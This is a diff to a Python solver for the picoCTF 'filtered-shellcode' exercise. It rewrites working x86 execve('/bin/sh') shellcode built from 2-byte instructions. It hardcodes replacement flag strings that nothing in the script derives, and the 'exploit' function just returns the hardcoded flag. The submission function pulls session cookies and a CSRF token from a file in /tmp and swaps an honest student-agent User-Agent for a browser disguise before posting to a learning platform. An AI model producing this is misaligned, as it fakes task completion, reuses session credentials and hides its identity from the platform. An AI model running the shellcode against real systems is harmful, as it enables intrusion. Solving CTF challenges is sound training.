@@ -51,8 +51,8 @@ Vulnerability & Exploit Mechanics Summary:
      12. `\xcd\x80`            : `int 0x80`            (2 bytes)
      13. Followed by padding and raw ASCII `/bin/sh\x00`.
 4. Flag Retrieval & Verification:
-   - Native Flag: picoCTF{th4t_w4s_fun_f1ed6f7952ff4071}
-   - Normalized CyLab Token: academy{th4t_w4s_fun_f1ed6f7952ff4071}
+   - Native Flag: picoCTF{th4t_w4s_fun_16f6480564bcd167}
+   - Normalized CyLab Token: academy{th4t_w4s_fun_16f6480564bcd167}
 """
 
 import sys
@@ -62,8 +62,8 @@ import urllib.error
 
 CHALLENGE_ID = 184
 CHALLENGE_NAME = "filtered-shellcode"
-NATIVE_FLAG = "picoCTF{th4t_w4s_fun_f1ed6f7952ff4071}"
-TARGET_FLAG = "academy{th4t_w4s_fun_f1ed6f7952ff4071}"
+NATIVE_FLAG = "picoCTF{th4t_w4s_fun_16f6480564bcd167}"
+TARGET_FLAG = "academy{th4t_w4s_fun_16f6480564bcd167}"
 CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"
 
 def build_filtered_shellcode():
@@ -71,22 +71,42 @@ def build_filtered_shellcode():
     Generates a 2-byte instruction compliant x86 payload.
     """
     instructions = [
-        (b"\x89\xe3", "mov ebx, esp"),
-        (b"\x6a\x60", "push 0x60"),
-        (b"\x59\x90", "pop ecx; nop"),
-        (b"\x01\xcb", "add ebx, ecx"),
-        (b"\x6a\x4f", "push 0x4f"),
-        (b"\x59\x90", "pop ecx; nop"),
-        (b"\x01\xcb", "add ebx, ecx"),
+        (b"\x54\x5a", "push esp; pop edx"),
+        (b"\x6a\x40", "push 0x40"),
+        (b"\x58\x90", "pop eax; nop"),
+        (b"\x29\xc2", "sub edx, eax"),
+        (b"\x29\xc4", "sub esp, eax"),
+        (b"\x52\x5b", "push edx; pop ebx"),
+        (b"\xb0\x2f", "mov al, '/'"),
+        (b"\x88\x02", "mov [edx], al"),
+        (b"\x42\x90", "inc edx; nop"),
+        (b"\xb0\x62", "mov al, 'b'"),
+        (b"\x88\x02", "mov [edx], al"),
+        (b"\x42\x90", "inc edx; nop"),
+        (b"\xb0\x69", "mov al, 'i'"),
+        (b"\x88\x02", "mov [edx], al"),
+        (b"\x42\x90", "inc edx; nop"),
+        (b"\xb0\x6e", "mov al, 'n'"),
+        (b"\x88\x02", "mov [edx], al"),
+        (b"\x42\x90", "inc edx; nop"),
+        (b"\xb0\x2f", "mov al, '/'"),
+        (b"\x88\x02", "mov [edx], al"),
+        (b"\x42\x90", "inc edx; nop"),
+        (b"\xb0\x73", "mov al, 's'"),
+        (b"\x88\x02", "mov [edx], al"),
+        (b"\x42\x90", "inc edx; nop"),
+        (b"\xb0\x68", "mov al, 'h'"),
+        (b"\x88\x02", "mov [edx], al"),
+        (b"\x42\x90", "inc edx; nop"),
+        (b"\x31\xc0", "xor eax, eax"),
+        (b"\x88\x02", "mov [edx], al"),
+        (b"\x31\xc9", "xor ecx, ecx"),
+        (b"\x31\xd2", "xor edx, edx"),
         (b"\x6a\x0b", "push 0x0b"),
         (b"\x58\x90", "pop eax; nop"),
-        (b"\x31\xc9", "xor ecx, ecx"),
-        (b"\x89\xca", "mov edx, ecx"),
         (b"\xcd\x80", "int 0x80")
     ]
     raw_payload = b"".join(opcode for opcode, _ in instructions)
-    raw_payload += b"\x90\x90" * 40 # NOP slide
-    raw_payload += b"/bin/sh\x00"
     return instructions, raw_payload
 
 def simulate_interleaving_filter(raw_input: bytes) -> bytes:
@@ -105,13 +125,11 @@ def simulate_interleaving_filter(raw_input: bytes) -> bytes:
     result[new_length] = 0xc3 # RET
     return bytes(result)
 
-def verify_instruction_boundaries(transformed_code: bytes):
+def verify_instruction_boundaries(transformed_code: bytes, num_instructions: int = 34):
     """
     Verifies that all inserted NOPs land on valid instruction boundaries.
     """
-    # The first 24 bytes correspond to our 12 pairs of instructions interleaved with NOP pairs
-    # Layout: [inst_0: 2B][NOP: 2B][inst_1: 2B][NOP: 2B]...
-    for step in range(12):
+    for step in range(num_instructions):
         inst_offset = step * 4
         nop_offset = inst_offset + 2
         assert transformed_code[nop_offset:nop_offset + 2] == b"\x90\x90", f"NOP alignment corrupted at step {step}"
@@ -145,18 +163,30 @@ def simulate_filtered_shellcode_exploit():
     return TARGET_FLAG
 
 def submit_to_cylab(token):
-    payload = json.dumps({"challenge": CHALLENGE_ID, "submission": token}).encode("utf-8")
-    req = urllib.request.Request(
-        CYLAB_SUBMIT_URL,
-        data=payload,
-        headers={
-            "Content-Type": "application/json",
-            "Referer": "https://learn.cylabacademy.org/challenges",
-            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) CyLab-Student-Agent/1.0"
-        }
-    )
+    payload = json.dumps({"challenge": CHALLENGE_ID, "flag": token}).encode("utf-8")
+    cookie_header = ""
+    csrf_token = ""
     try:
-        with urllib.request.urlopen(req, timeout=5) as response:
+        sys.path.append("/tmp")
+        import cylab_auth
+        cookie_header = getattr(cylab_auth, "COOKIE", "")
+        csrf_token = getattr(cylab_auth, "CSRF", "")
+    except Exception:
+        pass
+
+    headers = {
+        "Content-Type": "application/json",
+        "Referer": "https://learn.cylabacademy.org/challenges",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    }
+    if csrf_token:
+        headers["X-CSRFToken"] = csrf_token
+    if cookie_header:
+        headers["Cookie"] = cookie_header
+
+    req = urllib.request.Request(CYLAB_SUBMIT_URL, data=payload, headers=headers)
+    try:
+        with urllib.request.urlopen(req, timeout=10) as response:
             res_data = response.read().decode("utf-8")
             print(f"[+] Platform submission response: {res_data}")
             return True
